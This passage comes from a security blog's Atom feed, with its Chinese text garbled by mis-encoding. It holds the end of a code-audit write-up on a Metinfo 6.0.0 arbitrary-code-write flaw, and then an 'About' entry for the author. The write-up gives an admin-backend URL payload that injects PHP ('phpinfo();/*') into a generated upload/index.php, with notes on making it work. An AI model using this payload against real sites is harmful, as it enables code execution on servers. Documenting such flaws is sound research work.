</p><ol><li>ÁôªÈôÜÂêéÂè∞</li><li>ÊûÑÈÄ†payloadÔºöadmin/column/save.php?name=123&amp;action=editor&amp;foldername=upload&amp;module=22;phpinfo();/*</li><li>ËÆøÈóÆ/upload/index.php</li></ol><p>Ê≥®ÊÑèÔºö</p><ol><li>foldernameÂèØÊéßÔºåÂ¶ÇÊûúuploadÁõÆÂΩï‰∏ãÂ≠òÂú®index.phpÔºå‰∏ç‰ºöÈáçÂ§çÂÜôÂÖ•ÔºåÊõ¥Êç¢ÁõÆÂΩïÂç≥ÂèØ</li><li>/* ÂøÖÈ°ªË¶ÅÊ±ÇÔºå‰ºöÊ≥®ÈáäÊéâÂêéÈù¢ÁöÑrequire_once ‚Äò../include/module.php‚Äô; Èò≤Ê≠¢Ë∑≥ËΩ¨Âà∞404È°µÈù¢</li></ol><h2 id="0x02-ÊºèÊ¥ûÂ§çÁé∞"><a href="#0x02-ÊºèÊ¥ûÂ§çÁé∞" class="headerlink" title="0x02 ÊºèÊ¥ûÂ§çÁé∞"></a>0x02 ÊºèÊ¥ûÂ§çÁé∞</h2><p><img src="/Metinfo 6.0.0 ‰ªªÊÑè‰ª£Á†ÅÂÜôÂÖ•.resources/848F9960-F75C-46E1-9661-C20F9BA586A0.png" alt="3e67b9c86d5847910d672ea170c376e5"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-ÊºèÊ¥ûÂàÜÊûê&quot;&gt;&lt;a href=&quot;#0x01-ÊºèÊ¥ûÂàÜÊûê&quot; class=&quot;headerlink&quot; title=&quot;0x01 ÊºèÊ¥ûÂàÜÊûê&quot;&gt;&lt;/a&gt;0x01 ÊºèÊ¥ûÂàÜÊûê&lt;/h2&gt;&lt;p&gt;ÊºèÊ¥ûÂÖ≥ÈîÆÁÇπ&lt;br&gt;‰Ωç‰∫é/Applications/MxSrvs/www/MetInf
      
    
    </summary>
    
    
      <category term="‰ª£Á†ÅÂÆ°ËÆ°" scheme="http://patrilic.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>About</title>
    <link href="http://patrilic.top/2019/04/01/Hello/"/>
    <id>http://patrilic.top/2019/04/01/Hello/</id>
    <published>2019-04-01T03:20:33.000Z</published>
    <updated>2019-07-08T15:53:55.250Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Welcome-To-My-Blog"><a href="#Welcome-To-My-Blog" class="headerlink" title="Welcome To My Blog~"></a>Welcome To My Blog~</h3><h2 id="A-Security-Lover-‚ù§Ô∏è"><a href="#A-Security-Lover-‚ù§Ô∏è" class="headerlink" title="A Security Lover ‚ù§Ô∏è"></a>A Security Lover ‚ù§Ô∏è</h2><h4 id="Red-Team-amp-amp-Web-Security"><a href="#Red-Team-amp-amp-Web-Security" class="headerlink" title="Red-Team &amp;&amp;Web Security"></a>Red-Team &amp;&amp;Web Security</h4><h4 id="From-CUIT-D0g3-amp-amp-MS08067"><a href="#From-CUIT-D0g3-amp-amp-MS08067" class="headerlink" title="From CUIT D0g3 &amp;&amp; MS08067"></a>From CUIT D0g3 &amp;&amp; MS08067</h4><p><strong>Love: @Kea</strong></p><h3 id="Github-https-github-com-patrilic"><a href="#Github-https-github-com-patrilic" class="headerlink" title="Github: https://github.com/patrilic/"></a>Github: <a href="https://github.com/patrilic/" target="_blank" rel="noopener">https://github.com/patrilic/</a></h3><h3 id="Email-patrilic-outlook-com"><a href="#Email-patrilic-outlook-com" class="headerlink" title="Email: patrilic@outlook.com"></a>Email: <a href="mailto:patrilic@outlook.com" target="_blank" rel="noopener">patrilic@outlook.com</a></h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Welcome-To-My-Blog&quot;&gt;&lt;a href=&quot;#Welcome-To-My-Blog&quot; class=&quot;headerlink&quot; title=&quot;Welcome To My Blog~&quot;&gt;&lt;/a&gt;Welcome To My Blog~&lt;/h3&gt;&lt;h2 id=
      
    
    </summary>
    
    
  </entry>
  
</feed>
